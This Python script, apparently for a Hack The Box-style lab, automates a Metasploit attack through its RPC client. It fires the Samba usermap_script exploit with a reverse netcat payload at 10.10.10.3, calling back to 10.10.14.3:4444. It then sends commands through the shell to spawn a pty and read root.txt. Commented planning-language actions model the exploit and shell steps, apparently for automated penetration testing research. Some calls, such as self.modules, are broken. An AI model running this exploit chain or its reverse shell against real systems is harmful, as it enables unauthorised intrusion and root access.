from pymetasploit3.msfrpc import MsfRpcClient

def read_multiple_lines(shell):
    result = []
    while True:
        r = shell.read()
        if r != '':
            result.append(r)
        else:
            break
    
    return ''.join(result)

class MetasploitExecutor:
    def __init__(self, password, host_ip, listening_port, config):
        """
        It sets up the initial state by assigning values to instance attributes.
        """
        if config:
            pass
        else:
            self.client = MsfRpcClient(password, port=55552)
            self.host = host_ip
            self.listening_port = listening_port

    def exploit_and_execute_payload(self,
                                    target,
                                    exploit_module_name,
                                    payload_module_name,
                                    listening_host = None,
                                    listening_port = None):
        exploit = self.client.modules.use('exploit', exploit_module_name)

        exploit['RHOSTS'] = target

        payload = self.modules.use('payload', payload_module_name)
        
        # If listening_host wasn't provided, use the instance attribute (self.host)
        if listening_host is None:
            listening_host = self.host

        # If listening_port wasn't provided, use the instance attribute (self.listening_port)
        if listening_port is None:
            listening_port = self.listening_port

        payload['LHOST'] = listening_host
        payload['LPORT'] = listening_port

        exploit.execute(payload=payload)
        
    def communicate_with_msf_session(self,
                                     session_id,
                                     input_text):
        shell = self.client.sessions.session(session_id)
        shell.write(input_text)
        print(read_multiple_lines(shell))
        # print(shell.read())


# (:action use-exploit-slash-multi-slash-samba-slash-usermap_script
#     :parameters (?target - host ?p - payload)
#     :precondition (and
#       (running_smbd_3_0_20 ?target)
#       (not (executed ?target ?p)))
#     :effect (and
#       (executed_payload-slash-cmd-slash-unix-slash-reverse_netcat ?target ?p)
#       (executed_payload-slash-cmd-slash-unix-slash-adduser ?target ?p))
#   )

# (:action execute-cmd-slash-unix-slash-reverse_netcat
#     :parameters (?target - host ?p - payload)
#     :precondition (and
#       (executed_payload-slash-cmd-slash-unix-slash-reverse_netcat ?target ?p)
#       (not (have_an_interactive_shell ?target)))
#     :effect (and
#       (have_an_interactive_shell ?target))
#   )

if __name__ == "__main__":
    me = MetasploitExecutor(password = 'password', host_ip = '10.10.14.3', listening_port=4444)

    me.exploit_and_execute_payload(
        target = '10.10.10.3',
        exploit_module_name = 'multi/samba/usermap_script',
        payload_module_name= 'cmd/unix/reverse_netcat'
        )

    me.communicate_with_msf_session(
        session_id = '1',
        input_text = 'whoami'
        )

    me.communicate_with_msf_session(
        session_id = '1',
        input_text = "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
        )

    me.communicate_with_msf_session(
        session_id = '1',
        input_text = "cd root"
        )

    me.communicate_with_msf_session(
        session_id = '1',
        input_text = "cat root.txt"
        )